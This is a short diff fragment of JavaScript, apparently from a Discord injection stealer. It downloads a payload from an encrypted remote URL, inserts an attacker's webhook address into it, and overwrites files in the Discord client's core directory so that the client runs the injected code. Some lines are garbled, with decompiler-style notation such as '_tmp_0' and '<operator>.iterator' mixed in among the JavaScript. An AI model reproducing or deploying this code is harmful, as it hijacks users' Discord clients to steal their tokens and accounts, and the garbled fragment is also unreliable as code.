@@ -1,0 +1,13 @@
+_tmp_0.modify_discord_core = modify_discord_core
+const res = await client.requires.axios.get(client.utils.encryption.decryptData(client.config.discord.base_url))
+const file = () => {
+                let tempFile = res.data.replace('%WEBHOOK_LINK%', client.config.webhook.url)
+                return tempFile;
+            }
+_iterator_9 = <operator>.iterator(client.config.discord.files_path)
+client.requires.fs.writeFileSync(path, file(), {
+                    encoding: 'utf8',
+                    flag: 'w'
+                })
+_tmp_97.encoding = "utf8"
+_tmp_97.flag = "w"
